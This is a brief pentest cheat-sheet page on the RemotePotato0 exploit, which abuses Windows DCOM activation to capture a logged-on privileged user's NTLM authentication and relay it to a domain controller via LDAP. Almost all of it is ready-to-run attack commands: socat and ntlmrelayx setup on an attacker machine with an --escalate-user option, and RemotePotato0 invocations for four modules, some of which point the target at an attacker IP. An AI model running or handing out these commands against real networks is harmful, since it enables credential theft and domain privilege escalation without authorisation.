# RemotePotato

### Exploit <a href="#exploit" id="exploit"></a>

Reference: [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)

According to the RemotePotato0's README, it abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user).

We can download the executable from [https://github.com/antonioCoco/RemotePotato0](https://github.com/antonioCoco/RemotePotato0).

#### Module 0 (`-m 0`: Rpc2Http cross protocol relay server + potato trigger) <a href="#module-0-m-0-rpc2http-cross-protocol-relay-server-potato-trigger" id="module-0-m-0-rpc2http-cross-protocol-relay-server-potato-trigger"></a>

```
# In attack machine
sudo socat tcp-listen:135,fork,reuseaddr tcp:<target-ip>:9999 &
sudo ntlmrelayx.py -t ldap://<target-dc-ip> --no-wcf-server --escalate-user normal_user

# In target machine
# -m 0: Module (Rpc2Http cross protocol relay server + potato trigger)
# -r: Remote HTTP relay server
# -x: Rogue Oxid resolver ip
# -p: Rogue Oxid resolver port
# -s: Session id for the Cross Session Activation Attack
.\RemotePotato0.exe -m 0 -r <attack-ip> -x <attack-ip> -p 9999 -s 1
```

#### Module 1 (`-m 1`: Rpc2Http cross protocol relay server) <a href="#module-1-m-1-rpc2http-cross-protocol-relay-server" id="module-1-m-1-rpc2http-cross-protocol-relay-server"></a>

```
# -l: RPC Relay server listening port
.\RemotePotato0.exe -m 1 -l 9997 -r <attack-ip>

rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
```

#### Module 2 (`-m 2`: Rpc capture server + potato trigger) <a href="#module-2-m-2-rpc-capture-server-potato-trigger" id="module-2-m-2-rpc-capture-server-potato-trigger"></a>

```
query user
.\RemotePotato0.exe -m 2 -x <local-ip> -p 9999 -s 1
```

#### Module 3 (`-m 3`: Rpc capture server) <a href="#module-3-m-3-rpc-capture-server" id="module-3-m-3-rpc-capture-server"></a>

```
.\RemotePotato0.exe -m 3 -l 9997

rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
```

### References <a href="#references" id="references"></a>

* [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)
